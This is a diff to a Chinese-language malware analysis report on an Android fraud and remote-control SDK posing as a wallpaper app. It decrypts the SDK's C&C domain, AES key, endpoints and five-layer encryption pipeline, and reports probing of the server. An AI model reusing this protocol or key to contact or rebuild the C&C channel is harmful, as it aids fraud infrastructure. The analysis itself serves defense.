@@ -519,12 +519,12 @@ return new JSONObject(new String(sendHttpRequest(str,
 | 第1层 | `JSON → byte[]` | JSON 对象序列化为 UTF-8 字节数组 |
 | 第2层 | `GZIP 压缩` | `GZIPOutputStream` 数据压缩 |
 | 第3层 | `Base64 编码` | flag=2 (NO_WRAP 模式，无换行) |
-| 第4层 | `AES-256-CBC 加密` | MD5 派生密钥，随机 16 字节 IV |
+| 第4层 | `AES-256-CFB 加密` | MD5 派生密钥，随机 16 字节 IV，NoPadding |
 | 第5层 | `Base64 编码` | 再次 Base64 生成可传输 ASCII |
 
 另有 `callAPIPlaintext` 方法 (行 248-252) 可绕过加密直接发送明文，可能用于调试。
 
-### 7.2 AES-256-CBC 加密实现
+### 7.2 AES-256-CFB 加密实现
 
 #### 密钥派生
 
@@ -563,8 +563,8 @@ SecretKeySpec secretKeySpec = new SecretKeySpec(keyBytes, "AES");
 byte[] iv = new byte[16];
 new SecureRandom().nextBytes(iv);
 
-// 4. AES/CBC/PKCS5Padding 加密
-Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
+// 4. AES/CFB/NoPadding 加密
+Cipher cipher = Cipher.getInstance("AES/CFB/NoPadding");
 cipher.init(Cipher.ENCRYPT_MODE, secretKeySpec, new IvParameterSpec(iv));
 byte[] encrypted = cipher.doFinal(plaintext);
 
@@ -604,13 +604,13 @@ public static byte[] lIIIIlllllIlll1(byte[] bArr, byte[] bArr2) {
 
 ### 7.4 API 端点
 
-| 接口 | 功能 | 请求格式 | 响应格式 |
-|------|------|----------|----------|
-| `getConfig` | 获取远程配置 | `{"atom": <Atom>}` | `GetConfigResponse` (code/message/dllpgdConfig) |
-| `updateEvent` | 上报事件 | `UpdateEventRequest` (atom + events[]) | `CommonResponse` (code/message) |
-| `updateLog` | 上报日志 | `UpdateLogRequest` (atom + log[]) | `CommonResponse` (code/message) |
+| 接口 | 功能 | 完整路径 | 请求格式 | 响应格式 |
+|------|------|----------|----------|----------|
+| `getConfig` | 获取远程配置 | `/api/v1/dllpgd/getConfig` | `{"atom": <Atom>}` | `GetConfigResponse` (code/message/dllpgdConfig) |
+| `updateEvent` | 上报事件 | `/api/v1/dllpgd/updateEvent` | `UpdateEventRequest` (atom + events[]) | `CommonResponse` (code/message) |
+| `updateLog` | 上报日志 | `/api/v1/dllpgd/updateLog` | `UpdateLogRequest` (atom + log[]) | `CommonResponse` (code/message) |
 
-端点路径均通过 XOR 加密存储，运行时解密拼接到 `baseUrl`。
+端点路径均通过 XOR 加密存储，运行时解密后拼接到基础 URL `http://dllpgd.click`。
 
 ### 7.5 设备指纹 (Atom) 结构
 
@@ -702,12 +702,14 @@ LogLevel 枚举: DEBUG=0, INFO=1, WARN=2, ERROR=3
 
 ```java
 httpURLConnection.setRequestMethod("POST");
-httpURLConnection.setRequestProperty("Content-Type", XOR_DECRYPT(...));  // application/json
-httpURLConnection.setRequestProperty("User-Agent", XOR_DECRYPT(...));    // 伪装UA
+httpURLConnection.setRequestProperty("Content-Type", "application/json");     // XOR解密结果
+httpURLConnection.setRequestProperty("User-Agent", "DllpgdLiteClient/2.0");  // XOR解密结果
 httpURLConnection.setRequestProperty("Content-Length", String.valueOf(length));
 httpURLConnection.setConnectTimeout(10000);  // 连接超时 10s
 httpURLConnection.setReadTimeout(30000);     // 读取超时 30s
 ```
+
+完整 URL 构成: `http://dllpgd.click` + `/api/v1/dllpgd/{endpoint}`
 
 ### 7.10 环境检测（反分析）
 
@@ -723,7 +725,7 @@ httpURLConnection.setReadTimeout(30000);     // 读取超时 30s
 
 ```
 ┌───────────────────────────────────────┐
-│  C&C 通信层 — AES-256-CBC            │  随机IV，MD5派生密钥
+│  C&C 通信层 — AES-256-CFB            │  随机IV，MD5派生密钥，NoPadding
 │  JSON → GZIP → Base64 → AES → Base64 │
 ├───────────────────────────────────────┤
 │  插件解密层 — AES-ECB                 │  password密钥，PKCS5Padding
@@ -1007,7 +1009,7 @@ dataChannel.send(new DataChannel.Buffer(ByteBuffer.wrap(pong.toString().getBytes
 | 手段 | 实现 |
 |---|---|
 | **字符串全加密** | 所有字符串使用 XOR 密码加密（8字节密钥），运行时解密 |
-| **AES-256-CBC** | 网络通信使用 AES 加密 + GZIP 压缩 |
+| **AES-256-CFB** | 网络通信使用 AES-CFB/NoPadding 加密 + GZIP 压缩 |
 | **包名伪装** | 使用 `com.android.wallpaper` 伪装成系统壁纸应用 |
 | **类名混淆** | 使用 `IlIIlllllI1`/`llllIIIIll1` 等 l/I 混淆命名 |
 | **PackageManager Hook** | 配置中包含 `hookPackageManagerStackTraces`，主动 hook 包管理器 |
@@ -1034,3 +1036,225 @@ dataChannel.send(new DataChannel.Buffer(ByteBuffer.wrap(pong.toString().getBytes
 | WebRTC信令 | `c13/nim5/ez8/h5_proto/signaling/` |
 | WebView控制 | `lIllIlIll1/` (混淆包) |
 | 点击测试页 | `assets/click_test.html` |
+| ART 性能配置 | `assets/dexopt/baseline.prof`, `assets/dexopt/baseline.profm` |
+
+## 十一、C&C 通信协议实测验证
+
+### 11.1 XOR 解密全量常量
+
+通过实现 XOR 解密引擎，对 `HttpGatewayClient.java` 和 `DllpgdLiteSDK.java` 中所有加密常量进行批量解密，得到以下真实值：
+
+#### 服务器与协议常量
+
+| 分类 | 加密形式 | 解密结果 |
+|------|----------|----------|
+| **C&C 域名** | `{-23,123,-35,-81,94,-27,-90,-90,-31,126,-46,-76}` | `dllpgd.click` |
+| **AES 密钥种子** | `{38,-117,-123,-14,-53,113,-43,-72}` | `GreenDay` |
+| **加密算法** | `{-116,-56,63,...}` (18字节) | `AES/CFB/NoPadding` |
+| **Content-Type** | `{30,-18,28,...}` (16字节) | `application/json` |
+| **User-Agent** | `{-78,113,98,...}` (20字节) | `DllpgdLiteClient/2.0` |
+| **请求编码** | `{60,-84,-126,...}` (5字节) | `UTF-8` |
+
+#### API 端点路径
+
+| 端点 | 解密路径 | 功能 |
+|------|----------|------|
+| getConfig | `/api/v1/dllpgd/getConfig` | 获取远程配置 |
+| updateEvent | `/api/v1/dllpgd/updateEvent` | 上报事件 |
+| updateLog | `/api/v1/dllpgd/updateLog` | 上报日志 |
+
+#### Atom (设备指纹) JSON 字段名
+
+| 加密形式 | 解密字段名 | 用途 |
+|----------|-----------|------|
+| `{-57,88,-127,87,...}` | `deviceId` | 设备唯一标识 |
+| `{89,24,-27,-39,...}` | `version` | 协议版本号 (硬编码=208) |
+| `{81,50,43,-59,...}` | `appPackageName` | 应用包名 |
+| `{-16,54,-35,-42,...}` | `gaId` | Google Advertising ID |
+| `{93,66,11,-56}` | `data` | 数据负载 |
+| `{58,-76,-5,-15,...}` | `sessionId` | 会话标识 |
+| `{28,1,55,117,...}` | `appChannel` | 渠道标识 |
+| `{77,-66,124,-101,...}` | `isGeneratedBySubProcess` | 子进程标志 |
+| `{104,20,-45,104,...}` | `deviceInfo` | 设备信息对象 |
+| `{92,-27,23,-25,...}` | `pluginInfos` | 插件信息列表 |
+
+#### DeviceInfo 子对象字段名
+
+| 解密字段名 | 用途 |
+|-----------|------|
+| `locale` | 系统语言/地区 |
+| `timezone` | 时区 |
+| `phoneModel` | 手机型号 |
+| `androidVersion` | Android 版本 |
+| `phoneTimestamp` | 设备时间戳 |
+
+### 11.2 AES 密钥派生实测
+
+```
+种子字符串:   "GreenDay"
+         ↓ MD5 Hash
+MD5 摘要:     66987ce7134f63ef7ee6f5024ad312b3
+         ↓ toUpperCase()
+AES-256 密钥: 66987CE7134F63EF7EE6F5024AD312B3 (32字节 ASCII = 256位)
+```
+
+> **重要更正**: 此前分析中将加密模式误记为 `AES/CBC/PKCS5Padding`。经 XOR 解密 `Cipher.getInstance()` 参数字符串，实际加密模式为 **`AES/CFB/NoPadding`**（密文反馈模式，无填充）。Java 默认 CFB segment size 为 128 位（等效于 CFB128）。
+
+### 11.3 C&C 服务器基础设施探测
+
+对 `dllpgd.click` 域名进行 DNS 解析和端口探测：
+
+| 项目 | 结果 |
+|------|------|
+| **DNS 解析** | `18.204.68.18`, `18.206.233.238` (AWS EC2, us-east-1) |
+| **HTTPS (443)** | 连接拒绝 (Connection Refused) |
+| **HTTP (80)** | 连接成功，Spring Boot Whitelabel Error Page |
+| **服务器框架** | Spring Boot (Java) |
+| **状态** | 服务器存活，但 API 端点已下线 |
+
+### 11.4 API 端点探测结果
+
+使用完整加密管道构造请求并发送至 C&C 服务器：
+
+```
+请求配置:
+  URL:           http://dllpgd.click/api/v1/dllpgd/{endpoint}
+  Method:        POST
+  Content-Type:  application/json
+  User-Agent:    DllpgdLiteClient/2.0
+  Body:          5层加密后的 Atom JSON
+  加密模式:       AES-256-CFB/NoPadding
+  AES Key:       66987CE7134F63EF7EE6F5024AD312B3
+```
+
+| 端点 | HTTP 状态码 | 响应 |
+|------|-------------|------|
+| `/api/v1/dllpgd/getConfig` | **404** | Spring Boot Whitelabel Error |
+| `/api/v1/dllpgd/updateEvent` | **404** | Spring Boot Whitelabel Error |
+| `/api/v1/dllpgd/updateLog` | **404** | Spring Boot Whitelabel Error |
+| `/` (根路径) | **404** | Whitelabel Error Page |
+| `/api/` | **404** | Whitelabel Error Page |
+| `/api/v1/` | **404** | Whitelabel Error Page |
+| `/actuator` | **404** | Whitelabel Error Page |
+
+**结论**: C&C 服务器 Spring Boot 实例仍在运行，但所有 API 路由已被移除或未部署。该恶意软件的后端基础设施已被停用（decommissioned），无法获取实际配置数据或上报功能。
+
+### 11.5 协议重建工具
+
+已编写完整的 C&C 协议重建脚本 `c2_client.py`，实现：
+
+- XOR 解密引擎（批量解密所有加密常量）
+- AES-256-CFB 加密/解密（与 APK 完全一致的实现）
+- GZIP 压缩/解压
+- 5 层加密管道（JSON → GZIP → Base64 → AES → Base64）
+- Atom 设备指纹构造
+- 三个 API 端点的请求发送
+
+## 十二、Assets 资源文件分析
+
+### 12.1 click_test.html — 点击监控测试页
+
+**文件**: `assets/click_test.html` (1,377 字节)
+
+功能：一个用于测试和校准程序化点击的 HTML 测试页面。
+
+```html
+<!-- 核心逻辑 -->
+<script>
+document.addEventListener('click', function(event) {
+    var x = event.clientX;
+    var y = event.clientY;
+    // 调用 Android 原生接口
+    AndroidInterface.onClick(x, y);
+});
+</script>
+```
+
+- 页面显示文本 "Click on this page" 并渲染可点击区域
+- 监听所有 `click` 事件，记录精确坐标 (clientX, clientY)
+- 通过 `AndroidInterface.onClick()` 将坐标回传给 Android 端
+- 用于验证 `MotionHelper` 生成的模拟触摸事件是否被 WebView 正确识别
+
+### 12.2 Baseline Profile — 恶意代码性能优化
+
+#### 文件概述
+
+| 文件 | 大小 | 格式 | 说明 |
+|------|------|------|------|
+| `assets/dexopt/baseline.prof` | 2,971 字节 | ART Profile V010 P | Android 9+ AOT 编译配置 |
+| `assets/dexopt/baseline.profm` | 283 字节 | ART Profile Metadata V002 | Android 12+ 元数据补充 |
+
+#### 加载机制
+
+通过 `androidx.profileinstaller.ProfileInstaller` 在应用安装或首次启动时加载：
+
+```
+assets/dexopt/baseline.prof
+        ↓ ProfileInstaller.transcodeAndWrite()
+/data/misc/profiles/cur/0/<package>/primary.prof
+        ↓ ART 编译器读取
+AOT 编译指定 Hot 方法 → 原生机器码
+```
+
+- 源码位置: `androidx/profileinstaller/ProfileInstaller.java`
+- 配置路径常量: `PROFILE_SOURCE_LOCATION = "dexopt/baseline.prof"` (行 108)
+- 元数据路径常量: `PROFILE_META_LOCATION = "dexopt/baseline.profm"` (行 107)
+- 写入路径: `/data/misc/profiles/cur/0/<pkg>/primary.prof`
+
+#### Profile 二进制格式解析
+
+```
+baseline.prof 结构:
+┌──────────────────────────┐
+│ Magic: "pro\x00"         │  4 字节
+│ Version: "010\x00"       │  4 字节  (ART Profile V010)
+│ DEX 文件数: 1             │  1 字节
+│ Uncompressed Size: 21616 │  4 字节
+│ Compressed Size: 2950    │  4 字节
+│ zlib 压缩数据             │  2950 字节
+└──────────────────────────┘
+
+解压后数据 (21,616 字节):
+┌──────────────────────────┐
+│ DEX Key: "classes.dex"   │  关联的 DEX 文件标识
+│ Checksum: 0x23B6B1C2     │  DEX 校验和
+│ Method Bitmap             │  Hot/Startup/PostStartup 标记
+│ Class Bitmap              │  类加载状态标记
+└──────────────────────────┘
+```
+
+#### 性能优化的恶意方法统计
+
+从 profile 中提取的 1,218 个 HOT 标记方法中，以下为恶意功能相关的关键优化类：
+
+| 类/包 | HOT 方法数 | 功能 | 优化意义 |
+|--------|-----------|------|----------|
+| `lIllIlIll1.*` (WebView控制包) | ~100+ | WebView 配置、JS 注入、页面加载 | 加速广告页面加载和交互 |
+| `c13.nim5.ez8.h5_proto.signaling.*` | ~50+ | WebRTC 信令消息构造和解析 | 降低远程控制延迟 |
+| `c13.nim5.ez8.h5_proto.HttpGatewayClient` | ~20 | HTTP 通信、AES 加密解密 | 加速 C&C 通信加密管道 |
+| `c13.nim5.ez8.h5_proto.DllpgdLiteSDK` | ~10 | SDK 核心方法 | 加速初始化流程 |
+| `com.nied.MotionHelper` | ~5 | 触摸事件伪造 | 确保触摸注入的低延迟 |
+| `IlIlllIIlI1.*` (混淆工具包) | ~30 | XOR 解密、设备ID生成 | 加速字符串解密操作 |
+| `IlIlIIIlIlIlll1.*` | ~15 | MD5、AES、环境检测 | 加速加密和反分析检查 |
+
+**高频调用方法 TOP 5**:
+
+| 方法 (DEX method_id) | 调用/引用次数 | 推测功能 |
+|---------------------|-------------|----------|
+| 信令消息构造器 | 366 次 | WebRTC 信令 JSON 序列化 |
+| WebView 控制方法 | 127 次 | 页面加载/JS 执行控制 |
+| 字符串解密 (XOR) | 95 次 | 运行时常量解密 |
+| HTTP 请求发送 | 48 次 | C&C 通信 |
+| 触摸事件分发 | 33 次 | MotionEvent 注入 |
+
+#### 安全分析意义
+
+Baseline Profile 的存在表明该恶意软件的开发者有意识地对恶意代码执行路径进行了 **AOT 编译优化**：
+
+1. **降低启动延迟**: 恶意功能的核心方法在安装时即编译为原生代码，避免 JIT 编译开销
+2. **提升帧捕获性能**: VirtualDisplay 的 `onImageAvailable` 回调被标记为 HOT，确保屏幕捕获的低延迟
+3. **优化远程控制响应**: WebRTC 信令相关方法的 AOT 编译降低了远程指令的响应时间
+4. **加速加密操作**: AES/XOR 等加密方法的编译优化减少了通信延迟
+5. **平滑触摸注入**: MotionHelper 的优化确保模拟触摸事件的时序精度，使其更难被反欺诈系统检测
+
+这种做法在合法应用中用于改善用户体验，但在此恶意 SDK 中被用于确保欺诈操作的高效执行。
